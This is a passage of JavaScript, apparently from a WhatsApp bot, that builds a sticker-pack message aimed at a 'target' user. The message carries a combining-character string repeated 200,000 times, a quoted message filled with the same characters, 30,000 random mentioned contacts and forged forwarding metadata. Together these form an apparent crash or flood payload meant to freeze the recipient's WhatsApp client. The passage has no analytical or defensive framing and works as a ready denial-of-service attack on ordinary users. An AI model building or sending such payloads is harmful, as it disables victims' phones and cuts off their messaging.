꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟".repeat(200000),
          mediaKeyTimestamp: Number(Date.now() / 1000 | 0),
          trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
          thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
          thumbnailSha256: Buffer.from("hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=", "base64"),
          thumbnailEncSha256: Buffer.from("IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=", "base64"),

          thumbnailHeight: 252,
          thumbnailWidth: 252,

          imageDataHash: Buffer.from(
            "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            "base64"
          ),
          stickerPackSize: "192628378191",
          stickerPackOrigin: "USER_CREATED",
          contextInfo: {
            stanzaId: "HxD-" + Date.now(),
            participant: "0@s.whatsapp.net",
            remoteJid: target,
            forwardingScore: 9999,
            isForwarded: true,
            mentionedJid: [
              target,
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 30000 }, () =>
                `1${Math.floor(Math.random() * 499999)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              conversation: "꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ 